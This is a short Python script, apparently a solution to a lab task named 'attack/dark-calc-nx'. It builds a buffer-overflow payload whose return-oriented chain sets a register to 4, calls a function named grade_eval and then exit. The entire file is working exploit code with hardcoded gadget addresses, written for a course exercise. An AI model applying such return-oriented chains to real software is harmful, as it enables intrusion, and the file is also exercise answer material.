#!/usr/bin/env python3
"""Task 3: build the payload for attack/dark-calc-nx."""
import struct
import sys


def p64(value):
    return struct.pack("<Q", value)


pop_rdi_ret = 0x401A33
ret = 0x401A34
grade_eval = 0x401978
exit_plt = 0x4016E0

payload = b"A" * 16
payload += b"B" * 8
payload += p64(pop_rdi_ret)
payload += p64(4)
payload += p64(ret)
payload += p64(grade_eval)
payload += p64(ret)
payload += p64(exit_plt)

sys.stdout.buffer.write(payload + b"\n")
